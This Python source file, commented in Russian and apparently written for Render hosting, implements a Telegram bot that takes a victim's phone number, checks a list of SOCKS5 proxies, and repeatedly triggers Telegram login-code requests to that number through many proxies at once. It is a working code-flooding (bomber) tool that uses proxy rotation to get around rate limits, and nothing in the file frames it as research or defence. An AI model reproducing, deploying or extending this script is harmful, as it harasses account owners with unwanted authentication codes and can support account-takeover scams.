# d.py — версия для Render с учётом высоких задержек прокси
import os
import ssl
import socks
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from flask import Flask
from telethon import TelegramClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import random
import time

# ====== Конфиг (подстройте при необходимости) ======
PROXIES_FILE = "proxies.txt"
OK_PROXIES_FILE = "ok_proxies.txt"

# Таймауты увеличены из-за большой задержки прокси (ms)
TCP_TIMEOUT = 8.0       # время на TCP connect
SSL_TIMEOUT = 10.0     # время на TLS handshake
CONNECT_TIMEOUT = 18.0 # время на client.connect()
SEND_CODE_TIMEOUT = 18.0  # timeout для send_code_request

WORKERS = 30
MAX_SEND_PER_REQUEST = 20   # сколько прокси используем одновременно для попыток
SEND_CONCURRENCY = 3        # сколько одновременно `TelegramClient` запускаем
DELAY_BETWEEN_TASKS = 0.3   # пауза между запуском задач (чтобы не бить одновременно)
# ====================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID") or 0)
API_HASH = os.environ.get("API_HASH")
if not BOT_TOKEN or not API_ID or not API_HASH:
    raise RuntimeError("Установите переменные окружения BOT_TOKEN, API_ID, API_HASH")

def parse_proxy_line(line: str):
    """
    Поддерживаем:
      - ip:port
      - ip:port:lat_ms  (опционально, если у вас есть измеренная задержка)
    Возвращает (ip, port, latency_ms_or_None)
    """
    parts = line.strip().split(":")
    if len(parts) < 2:
        return None
    ip = parts[0].strip()
    try:
        port = int(parts[1].strip())
    except:
        return None
    latency = None
    if len(parts) >= 3:
        try:
            latency = int(parts[2])
        except:
            latency = None
    return (ip, port, latency)

def load_proxies(filename=PROXIES_FILE):
    proxies = []
    if not os.path.exists(filename):
        return proxies
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            p = parse_proxy_line(s)
            if p:
                proxies.append(p)
    return proxies

# Синхронная проверка proxy: TCP + TLS handshake
def check_proxy_sync(ip: str, port: int, tcp_timeout=TCP_TIMEOUT, ssl_timeout=SSL_TIMEOUT) -> bool:
    s = socks.socksocket()
    try:
        s.set_proxy(socks.SOCKS5, ip, port, rdns=True)
        s.settimeout(tcp_timeout)
        # используем IP Telegram для надёжности (DNS может быть блокирован)
        s.connect(("149.154.167.99", 443))
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False
    try:
        s.settimeout(ssl_timeout)
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(s, server_hostname="api.telegram.org")
        ss.do_handshake()
        ss.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

async def filter_working_proxies(proxies, workers=WORKERS):
    if not proxies:
        return []
    loop = asyncio.get_running_loop()
    good = []
    with ThreadPoolExecutor(max_workers=min(workers, len(proxies))) as ex:
        tasks = [loop.run_in_executor(ex, partial(check_proxy_sync, ip, port)) for ip, port, _ in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    for (ip, port, latency), r in zip(proxies, results):
        if r is True:
            good.append((ip, port, latency))
    return good

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Пришлите номер в формате +79998887766")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+") or not phone[1:].isdigit():
        await update.message.reply_text("Неверный формат. Пример: +79998887766")
        return

    msg = await update.message.reply_text("Принял. Проверяю прокси и отправляю коды...")

    proxies = load_proxies(PROXIES_FILE)
    if not proxies:
        await msg.edit_text("Нет прокси в файле proxies.txt")
        return

    # Сначала быстро отфильтровать живые прокси (TCP+SSL)
    await msg.edit_text("Проверяю прокси на доступность (может занять несколько секунд)...")
    good = await filter_working_proxies(proxies)

    if not good:
        await msg.edit_text("Не найдено доступных прокси.")
        return

    # Сохраняем рабочие
    with open(OK_PROXIES_FILE, "w", encoding="utf-8") as f:
        for ip, port, latency in good:
            if latency is None:
                f.write(f"{ip}:{port}\n")
            else:
                f.write(f"{ip}:{port}:{latency}\n")

    # Сортируем: сначала низкая latency (если известно), иначе рандом
    known = [g for g in good if g[2] is not None]
    unknown = [g for g in good if g[2] is None]
    known.sort(key=lambda x: x[2])
    ordered = known + unknown
    # Берём ограниченное число прокси для отправки (чтобы не создавать сотни сессий)
    to_try = ordered[:MAX_SEND_PER_REQUEST]
    # Если latency известна — можно дополнительно отсечь слишком большие задержки
    # (например latency > 3000 ms можно пропустить) — но пока используем все.

    sent = 0
    sem = asyncio.Semaphore(SEND_CONCURRENCY)

    async def try_send_via_proxy(ip, port, latency):
        nonlocal sent
        proxy = (socks.SOCKS5, ip, port)
        session = f"session_{ip.replace('.', '_')}_{port}"
        async with sem:
            try:
                client = TelegramClient(session, API_ID, API_HASH, proxy=proxy)
                # connect с timeout
                try:
                    await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                except asyncio.TimeoutError:
                    print(f"[timeout] client.connect() через {ip}:{port}")
                    try:
                        await client.disconnect()
                    except:
                        pass
                    return
                except Exception as e:
                    print(f"[warn] connect failed {ip}:{port}: {repr(e)}")
                    try:
                        await client.disconnect()
                    except:
                        pass
                    return

                try:
                    # Если сессия уже авторизована — ничего не делаем
                    try:
                        is_auth = await asyncio.wait_for(client.is_user_authorized(), timeout=6)
                    except Exception:
                        is_auth = False
                    if not is_auth:
                        try:
                            await asyncio.wait_for(client.send_code_request(phone), timeout=SEND_CODE_TIMEOUT)
                            sent += 1
                            print(f"[ok] send_code_request via {ip}:{port}")
                        except asyncio.TimeoutError:
                            print(f"[timeout] send_code_request via {ip}:{port}")
                        except Exception as e_inner:
                            print(f"[warn] send_code_request failed via {ip}:{port}: {repr(e_inner)}")
                finally:
                    try:
                        await client.disconnect()
                    except:
                        pass
            except Exception as e_outer:
                print(f"[warn] Ошибка Telethon через {ip}:{port}: {repr(e_outer)}")

    tasks = []
    for ip, port, latency in to_try:
        tasks.append(asyncio.create_task(try_send_via_proxy(ip, port, latency)))
        await asyncio.sleep(DELAY_BETWEEN_TASKS)

    if tasks:
        await asyncio.gather(*tasks)

    await msg.edit_text(f"Готово. Рабочих прокси: {len(good)}. Успешных попыток отправки кода: {sent}.")

def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return app

# Flask health endpoint для Render
flask_app = Flask(__name__)
@flask_app.route("/", methods=["GET"])
def index():
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port)

def ensure_event_loop():
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

def main():
    t = threading.Thread(target=run_flask, daemon=True, name="flask_bg")
    t.start()
    app = build_app()
    ensure_event_loop()
    try:
        print("Бот запускается (polling)...")
        app.run_polling()
    except Exception as e:
        print("Ошибка при запуске бота:", e)

if __name__ == "__main__":
    main()
